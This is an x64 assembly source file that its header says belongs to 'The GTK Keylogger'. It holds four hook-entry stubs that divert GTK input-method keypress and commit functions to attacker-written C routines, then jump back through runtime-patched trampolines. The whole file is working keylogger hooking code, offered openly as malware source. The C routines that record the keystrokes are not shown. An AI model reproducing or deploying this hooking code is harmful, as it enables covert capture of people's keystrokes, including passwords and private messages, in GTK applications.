/*
 * This file is the source code for the hook entries of each function to be hooked, supporting the architecture x64.
 *
 * This is also part of The GTK Keylogger.
 *
 * Authors:
 *
 * Abel Romero Pérez aka D1W0U - abel@abelromero.com - @diw0u - http://www.abelromero.com 
 * David Reguera García aka Dreg - dreg@fr33project.org - @fr33project - http://www.fr33project.org
 *
 */

// hook_entry:
// pop rax
// pushfq
// pushq registers
// call mi rutina en C
// popq registers
// popfq
// jmpq trampolines[]

.globl gtk_im_multicontext_commit_cb_hook_entry

.globl gtk_im_multicontext_commit_cb_hook_entry_jmp_addr

.globl gtk_im_multicontext_filter_keypress_hook_entry

.globl gtk_im_multicontext_filter_keypress_hook_entry_jmp_addr

.globl gtk_im_context_simple_commit_char_hook_entry

.globl gtk_im_context_simple_commit_char_hook_entry_jmp_addr

.globl gtk_im_context_simple_filter_keypress_hook_entry

.globl gtk_im_context_simple_filter_keypress_hook_entry_jmp_addr

gtk_im_multicontext_commit_cb_hook_entry:
  popq %rax
  pushfq
  pushq %rax
  pushq %rbx
  pushq %rcx
  pushq %rdx
  pushq %rbp
  pushq %rsp
  pushq %rsi
  pushq %rdi
  pushq %r8
  pushq %r9
  pushq %r10
  pushq %r11
  pushq %r12
  pushq %r13
  pushq %r14
  pushq %r15
  callq *My_gtk_im_multicontext_commit_cb@GOTPCREL(%rip)
  popq %r15
  popq %r14
  popq %r13
  popq %r12
  popq %r11
  popq %r10
  popq %r9
  popq %r8
  popq %rdi
  popq %rsi
  popq %rsp
  popq %rbp
  popq %rdx
  popq %rcx
  popq %rbx
  popq %rax
  popfq
  jmpq *(%rip)

gtk_im_multicontext_commit_cb_hook_entry_jmp_addr:
  .quad 0xdeadbabedeadbabe


gtk_im_context_simple_commit_char_hook_entry:
  popq %rax
  pushfq
  pushq %rax
  pushq %rbx
  pushq %rcx
  pushq %rdx
  pushq %rbp
  pushq %rsp
  pushq %rsi
  pushq %rdi
  pushq %r8
  pushq %r9
  pushq %r10
  pushq %r11
  pushq %r12
  pushq %r13
  pushq %r14
  pushq %r15
  callq *My_gtk_im_context_simple_commit_char@GOTPCREL(%rip)
  popq %r15
  popq %r14
  popq %r13
  popq %r12
  popq %r11
  popq %r10
  popq %r9
  popq %r8
  popq %rdi
  popq %rsi
  popq %rsp
  popq %rbp
  popq %rdx
  popq %rcx
  popq %rbx
  popq %rax
  popfq
  jmpq *(%rip)

gtk_im_context_simple_commit_char_hook_entry_jmp_addr:
  .quad 0xdeadbabedeadbabe


gtk_im_multicontext_filter_keypress_hook_entry:
  popq %rax
  pushfq
  pushq %rax
  pushq %rbx
  pushq %rcx
  pushq %rdx
  pushq %rbp
  pushq %rsp
  pushq %rsi
  pushq %rdi
  pushq %r8
  pushq %r9
  pushq %r10
  pushq %r11
  pushq %r12
  pushq %r13
  pushq %r14
  pushq %r15
  callq *My_gtk_im_multicontext_filter_keypress@GOTPCREL(%rip)
  popq %r15
  popq %r14
  popq %r13
  popq %r12
  popq %r11
  popq %r10
  popq %r9
  popq %r8
  popq %rdi
  popq %rsi
  popq %rsp
  popq %rbp
  popq %rdx
  popq %rcx
  popq %rbx
  popq %rax
  popfq
  jmpq *(%rip)

gtk_im_multicontext_filter_keypress_hook_entry_jmp_addr:
  .quad 0xdeadbabedeadbabe


gtk_im_context_simple_filter_keypress_hook_entry:
  popq %rax
  pushfq
  pushq %rax
  pushq %rbx
  pushq %rcx
  pushq %rdx
  pushq %rbp
  pushq %rsp
  pushq %rsi
  pushq %rdi
  pushq %r8
  pushq %r9
  pushq %r10
  pushq %r11
  pushq %r12
  pushq %r13
  pushq %r14
  pushq %r15
  callq *My_gtk_im_context_simple_filter_keypress@GOTPCREL(%rip)
  popq %r15
  popq %r14
  popq %r13
  popq %r12
  popq %r11
  popq %r10
  popq %r9
  popq %r8
  popq %rdi
  popq %rsi
  popq %rsp
  popq %rbp
  popq %rdx
  popq %rcx
  popq %rbx
  popq %rax
  popfq
  jmpq *(%rip)

gtk_im_context_simple_filter_keypress_hook_entry_jmp_addr:
  .quad 0xdeadbabedeadbabe
